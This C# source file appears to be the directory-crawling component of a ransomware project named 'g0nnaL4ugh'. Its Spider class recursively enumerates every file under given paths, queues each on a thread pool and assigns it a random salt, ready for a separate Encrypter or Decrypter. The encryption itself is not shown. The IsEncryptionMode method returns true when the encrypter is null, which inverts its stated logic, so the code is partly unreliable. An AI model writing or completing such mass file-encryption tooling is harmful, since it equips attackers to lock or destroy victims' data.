using System;
using System.Threading;
using System.Collections.Generic;
#if DEBUG
using System.Diagnostics;
#endif
using System.IO;
using g0nnaL4ugh.Crypto;
using g0nnaL4ugh.Finder;

namespace g0nnaL4ugh
{
	public class TaskObject
    {
        private string filePath;
        private List<Node> db;

        public TaskObject(string filePath, List<Node> db)
        {
            this.filePath = filePath;
			this.db = db;            
        }

		public string FilePath { get { return this.filePath; } }
		public List<Node> Db { get { return this.db; } }
    }

    public class Spider
    {
		string[] initialPaths;
		List<Node> nodes;
		Encrypter encrypter;
		Decrypter decrypter;

		public Spider(string[] paths, Encrypter encrypter)
		{
			this.initialPaths = paths;
			this.encrypter = encrypter;
			this.nodes = new List<Node>();
		}

		public Spider(string[] paths, Decrypter decrypter)
        {
            this.initialPaths = paths;
			this.decrypter = decrypter;
            this.nodes = new List<Node>();
        }

		public void BuildNodesFromPath()
		{
			/*
			 * Here can be 2 options:
			 *  - Encrypt
			 *  - Decrypt
            */
			/* string randomString = Encrypter.generateRandomPrivateKey(32);
			Console.WriteLine(randomString);*/
			foreach (string path in this.initialPaths)
			{
#if DEBUG
				Stopwatch watch = new Stopwatch();
				watch.Start();
#endif
				// Console.WriteLine("Processing path: " + path);
				this.ProcessDirectory(path, this.nodes);
#if DEBUG
				Double s = watch.ElapsedMilliseconds / 1000d;
				Double m = watch.ElapsedMilliseconds / 60000d;
				Console.WriteLine("Time consumed by ProcessDirectory is: {0:N2}s", s);
				watch.Stop();
#endif
			}
		}

		private void ProcessDirectory(string path, List<Node> db)
		{
			Console.WriteLine("Processing dir: " + path);
			string[] files = Directory.GetFiles(path);
            string[] childDirectories = Directory.GetDirectories(path);

			foreach(string filePath in files)
			{
				TaskObject taskObject = new TaskObject(filePath, db);
				ThreadPool.QueueUserWorkItem(new WaitCallback(ProcessFile2EncCallback2), taskObject);
                // this.ProcessFile2EncCallback2(filePath);	
			}
			
			foreach(string dir in childDirectories)
				this.ProcessDirectory(dir, db);

		}

		private void ProcessFile2EncCallback2(object taskObject)
		{
			List<Node> db = ((TaskObject)taskObject).Db;
			var filePath = ((TaskObject)taskObject).FilePath;
			string generatedSalt = this.encrypter.GenerateRandomSalt(32);
			Node node = new Node(NodeType.File, filePath, generatedSalt);
            db.Add(node);
			Console.WriteLine("[T: " + Thread.CurrentThread.ManagedThreadId + "] " +
			                  "Processing file & salt: " + generatedSalt);
		}

		private bool IsEncryptionMode() {
			/* 
			 * We difference the mode of operation by asking if
			 * encrypter is null.
            */
			return this.encrypter == null;
		}
    }
}
